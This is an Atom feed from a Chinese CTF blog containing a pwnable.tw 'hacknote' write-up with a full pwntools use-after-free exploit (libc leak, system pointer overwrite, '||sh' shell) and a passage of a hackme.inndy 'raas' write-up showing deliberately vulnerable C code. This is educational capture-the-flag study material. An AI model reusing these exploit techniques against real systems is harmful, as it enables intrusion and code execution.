<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ZeroKeeper</title>
  
  <subtitle>ZeroKeeper</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zerokeeper.github.io/"/>
  <updated>2019-10-21T14:41:26.728Z</updated>
  <id>http://zerokeeper.github.io/</id>
  
  <author>
    <name>zerokeeper</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>pwnable.tw hacknote wp</title>
    <link href="http://zerokeeper.github.io/writeup/pwnabletw-hacknote-wp.html"/>
    <id>http://zerokeeper.github.io/writeup/pwnabletw-hacknote-wp.html</id>
    <published>2019-06-15T07:13:00.000Z</published>
    <updated>2019-10-21T14:41:26.728Z</updated>
    
    <content type="html"><![CDATA[<p>pwnable.tw上hacknote的wp</p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>保护</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br></pre></td></tr></table></figure><p>程序有三个基本操作，add、delete、print笔记，其中delete中free后没有把指针置为null，可创造一个迷途指针，导致了uaf漏洞<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/15/15606068324547.jpg" alt=""></p><p>add note功能：<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/15/15606069033084.jpg" alt=""></p><p>看到malloc了8字节的一个结构体，分别存放函数地址0x804862b（打印content的内容）和一个指向当前note内容content的指针</p><figure class="highlight thrift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span></span>&#123;</span><br><span class="line">*putnote;   <span class="comment">//指向用于输出note内容的函数( *(_DWORD *)ptr[i] = putnote;)</span></span><br><span class="line">*text;   <span class="comment">//指向note对应的内容(read(0, *((void **)ptr[i] + 1), size);)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而后根据size再申请新的空间：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">v0</span> = ptr[i]<span class="comment">;</span></span><br><span class="line"><span class="attr">v0[1]</span> = malloc(size)<span class="comment">;//申请存储note内容的地址</span></span><br></pre></td></tr></table></figure><p>基本的思路是先add 两次，但是内容的大小不能是8字节，不然会分配4个 16字节的fast bin；然后再delete两次，此时 fast bin链表如图：</p><p><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/15/15606085424463.jpg" alt=""><br>因为prev_size 和 size 在 32 位下占 8 bytes ，所以结构体的实际堆块大小为 16 bytes。在申请 content 内容时要大于 16 bytes。</p><p>这里需要了解malloc内存对齐的知识：<br>在32位下malloc的最小分配单位为16字节，64位下最小分配单位为32字节，其中request2size就是malloc的内存对齐操作。<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/15/15606089332140.jpg" alt=""></p><p>从request2size还可以知道，如果是64位系统，申请内存为1 ~ 24字节时，系统内存消耗32字节，当申请内存为25字节时，系统内存消耗48字节。 如果是32位系统，申请内存为1 ~ 12字节时，系统内存消耗16字节，当申请内存为13字节时，系统内存消耗24字节。（类似计算MINSIZE）</p><h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><ul><li>add_note首先malloc出8字节来存放note结构体，接着用户输入content的size：16，这样操作两次，分配的内存大小为16-&gt;24-&gt;16-&gt;24</li><li>delete_note来释放内存，delete_note（0），delete_note（1）<br>接着add_note，增加一个content size=8，内容为’ccccdddd’</li><li>因此新建的note2的strcut note将被分配到note1的结构体位置，note2的content将被分配到note0的结构体位置，note0八字节的结构体处分别存放了打印函数0x804862b和其参数地址，现在将被输入的content覆盖，再执行print(0),覆盖的函数和内容就会执行。</li></ul><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>添加两个note后的堆<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/15/15606108479682.jpg" alt=""><br>free两个note后的堆<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/15/15606109974949.jpg" alt=""><br>再添加note2为ccccdddd<br><img src="https://static-1257872780.cos.ap-shanghai.myqcloud.com/2019/06/15/15606110247777.jpg" alt=""></p><p>可以看到strcut note0结构体的putnote和text指针已经被覆盖成了cccc、ddddd</p><h4 id="泄露libc："><a href="#泄露libc：" class="headerlink" title="泄露libc："></a>泄露libc：</h4><p>题目已经给出了libc文件，我们要泄露出libc加载到内存中的基址：<br>以read()为例，我们将指向content的指针覆盖为read在got表中的地址，这样调用print_note后就会打印出read的实际地址。</p><p>再利用：system_addr-libc_system=read_addr-libc_read<br>得到 system_addr=read_addr-libc_read+libc_system</p><p>到了system的实际地址，只需要重复相同的步骤，只是将原本0x804862b覆盖为system的地址，就可以get system了。</p><p>注意点：覆盖后system的参数实际上是从note0结构体开始的，也就是p32(system_addr)+’sh’，这样是无法达到system(‘/bin/sh’)的效果的，要用到system参数截断的姿势，当时用的是&amp;&amp;sh，类似的还有<code>||sh</code>，<code>;sh;</code></p><h3 id="最终exp："><a href="#最终exp：" class="headerlink" title="最终exp："></a>最终exp：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_note</span><span class="params">(size,content)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">"1"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">"size :"</span>)</span><br><span class="line">      p.sendline(size)</span><br><span class="line">      p.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">      p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">"2"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_note</span><span class="params">(index)</span>:</span></span><br><span class="line">      p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">      p.sendline(<span class="string">"3"</span>)</span><br><span class="line">      p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">      p.sendline(index)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'i386'</span>,log_level=<span class="string">'debug'</span>)</span><br><span class="line"><span class="comment"># p=process('./hacknote')</span></span><br><span class="line">p = remote(<span class="string">'chall.pwnable.tw'</span>, <span class="number">10102</span>)</span><br><span class="line">elf=ELF(<span class="string">"./hacknote"</span>)</span><br><span class="line">libc=ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">read_got=elf.got[<span class="string">"read"</span>]</span><br><span class="line">putnote=<span class="number">0x804862b</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">add_note(<span class="string">"20"</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">add_note(<span class="string">"20"</span>,<span class="string">"bbbb"</span>)</span><br><span class="line">delete_note(<span class="string">'0'</span>)</span><br><span class="line">delete_note(<span class="string">'1'</span>)</span><br><span class="line">add_note(<span class="string">'8'</span>,p32(putnote)+p32(read_got))</span><br><span class="line">print_note(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">read_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># print hex(read_addr)</span></span><br><span class="line">system_addr=read_addr-libc.symbols[<span class="string">'read'</span>]+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># execute system('sh')</span></span><br><span class="line">delete_note(<span class="string">'2'</span>)</span><br><span class="line">add_note(<span class="string">'8'</span>,p32(system_addr)+<span class="string">'||sh\x00'</span>)</span><br><span class="line">print_note(<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/qq_35429581/article/details/78231443" target="_blank" rel="noopener">https://blog.csdn.net/qq_35429581/article/details/78231443</a><br><a href="http://www.carlstar.club/2019/03/01/hacknote/" target="_blank" rel="noopener">http://www.carlstar.club/2019/03/01/hacknote/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;pwnable.tw上hacknote的wp&lt;/p&gt;
&lt;h3 id=&quot;程序分析&quot;&gt;&lt;a href=&quot;#程序分析&quot; class=&quot;headerlink&quot; title=&quot;程序分析&quot;&gt;&lt;/a&gt;程序分析&lt;/h3&gt;&lt;p&gt;保护&lt;/p&gt;
&lt;figure class=&quot;highlight 
      
    
    </summary>
    
    
      <category term="writeup" scheme="http://zerokeeper.github.io/categories/writeup/"/>
    
    
      <category term="ctf" scheme="http://zerokeeper.github.io/tags/ctf/"/>
    
      <category term="pwn" scheme="http://zerokeeper.github.io/tags/pwn/"/>
    
      <category term="pwnable" scheme="http://zerokeeper.github.io/tags/pwnable/"/>
    
  </entry>
  
  <entry>
    <title>hackme.inndy raas wp</title>
    <link href="http://zerokeeper.github.io/writeup/hackmeinndy-raas-wp.html"/>
    <id>http://zerokeeper.github.io/writeup/hackmeinndy-raas-wp.html</id>
    <published>2019-06-14T03:30:00.000Z</published>
    <updated>2019-10-20T15:35:04.545Z</updated>
    
    <content type="html"><![CDATA[<h1 id="hackme-inndy-raas-wp"><a href="#hackme-inndy-raas-wp" class="headerlink" title="hackme.inndy raas wp"></a>hackme.inndy raas wp</h1><p>查看保护</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">Arch:</span>     <span class="string">i386-32-little</span></span><br><span class="line"><span class="attr">RELRO:</span>    <span class="string">Partial</span> <span class="string">RELRO</span></span><br><span class="line"><span class="attr">Stack:</span>    <span class="string">Canary</span> <span class="string">found</span></span><br><span class="line"><span class="attr">NX:</span>       <span class="string">NX</span> <span class="string">enabled</span></span><br><span class="line"><span class="attr">PIE:</span>      <span class="literal">No</span> <span class="string">PIE</span> <span class="string">(0x8048000)</span></span><br></pre></td></tr></table></figure><p>程序代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">record</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> (*print)(struct record *);</span><br><span class="line"><span class="keyword">void</span> (*<span class="built_in">free</span>)(struct record *);</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="keyword">int</span> integer;</span><br><span class="line"><span class="keyword">char</span> *<span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">record</span> *<span class="title">records</span>[16];</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ask</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> * q)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buff[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s &gt; "</span>, q);</span><br><span class="line">fgets(buff, <span class="keyword">sizeof</span>(buff), <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">return</span> atoi(buff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rec_int_print</span><span class="params">(struct record *rec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Record(Type=Integer, Value=%d)\n"</span>, rec-&gt;integer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rec_str_print</span><span class="params">(struct record *rec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Record(Type=String, Value=%s)\n"</span>, rec-&gt;<span class="built_in">string</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rec_int_free</span><span class="params">(struct record *rec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">free</span>(rec);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Record freed!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rec_str_free</span><span class="params">(struct record *rec)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">free</span>(rec-&gt;<span class="built_in">string</span>);</span><br><span class="line"><span class="built_in">free</span>(rec);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Record freed!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> idx = ask(<span class="string">"Index"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt; <span class="number">16</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Out of index!"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(records[idx]) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Index #%d is used!\n"</span>, idx);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">record</span> *<span class="title">r</span> = <span class="title">records</span>[<span class="title">idx</span>] = (<span class="title">struct</span> <span class="title">record</span> *)<span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">record</span>));</span></span><br><span class="line">r-&gt;print = rec_int_print;</span><br><span class="line">r-&gt;<span class="built_in">free</span> = rec_int_free;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Blob type:"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"1. Integer"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"2. Text"</span>);</span><br><span class="line"><span class="keyword">int</span> type = ask(<span class="string">"Type"</span>);</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(type) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">r-&gt;integer = ask(<span class="string">"Value"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">len = ask(<span class="string">"Length"</span>);</span><br><span class="line"><span class="keyword">if</span>(len &gt; <span class="number">1024</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Length too long, please buy record service premium to store longer record!"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">r-&gt;<span class="built_in">string</span> = <span class="built_in">malloc</span>(len);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Value &gt; "</span>);</span><br><span class="line">fgets(r-&gt;<span class="built_in">string</span>, len, <span class="built_in">stdin</span>);</span><br><span class="line">r-&gt;print = rec_str_print;</span><br><span class="line">r-&gt;<span class="built_in">free</span> = rec_str_free;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Invalid type!"</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Okey, we got your data. Here is it:"</span>);</span><br><span class="line">r-&gt;print(r);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> idx = ask(<span class="string">"Index"</span>);</span><br><span class="line">records[idx]-&gt;<span class="built_in">free</span>(records[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_dump</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> idx = ask(<span class="string">"Index"</span>);</span><br><span class="line">records[idx]-&gt;print(records[idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">alarm(<span class="number">600</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Welcome to use my Record-as-a-Service (free plan)"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"You can only save Integer or String for 600 seconds"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Pay 1,000,000,000,000,000,000,000,000 bitcoins to buy premium plan"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Here is term of service. You must agree to use this service. Please read carefully!"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"================================================================================"</span>);</span><br><span class="line">system(<span class="string">"cat tos.txt | head -n 30 | sed -e 's/^/    /'"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"================================================================================"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"1. New record"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"2. Del record"</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"3. Show record"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(ask(<span class="string">"Act"</span>)) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">do_new();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">do_del();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">do_dump();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Bye~ Thanks for using our service!"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>这个题目给了源代码，题目提示是uaf。<br>题目分析，程序有三种操作，添加记录、删除记录，展示记录。其中删除记录中，只是释放了空间，但是指针没有被清空，导致uaf。</p><p>结构体如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">record</span> &#123;</span></span><br><span class="line"><span class="keyword">void</span> (*print)(struct record *);</span><br><span class="line"><span class="keyword">void</span> (*<span class="built_in">free</span>)(struct record *);</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="keyword">int</span> integer;</span><br><span class="line"><span class="keyword">char</span> *<span class="built_in">string</span>;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>看do_new函数逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">do_new</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = ask(<span class="string">"Index"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> || v2 &gt; <span class="number">16</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Out of index!"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( records[v2] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Index #%d is used!\n"</span>, v2);</span><br><span class="line">  records[v2] = <span class="built_in">malloc</span>(<span class="number">0xC</span>u);</span><br><span class="line">  v3 = records[v2];</span><br><span class="line">  *v3 = rec_int_print;</span><br><span class="line">  *(v3 + <span class="number">4</span>) = rec_int_free;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Blob type:"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"1. Integer"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"2. Text"</span>);</span><br><span class="line">  v1 = ask(<span class="string">"Type"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    *(v3 + <span class="number">8</span>) = ask(<span class="string">"Value"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Invalid type!"</span>);</span><br><span class="line">    size = ask(<span class="string">"Length"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x400</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Length too long, please buy record service premium to store longer record!"</span>);</span><br><span class="line">    *(v3 + <span class="number">8</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Value &gt; "</span>);</span><br><span class="line">    fgets(*(v3 + <span class="number">8</span>), size, _bss_start);</span><br><span class="line">    *v3 = rec_str_print;</span><br><span class="line">    *(v3 + <span class="number">4</span>) = rec_str_free;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Okey, we got your data. Here is it:"</span>);</span><br><span class="line">  <span class="keyword">return</span> 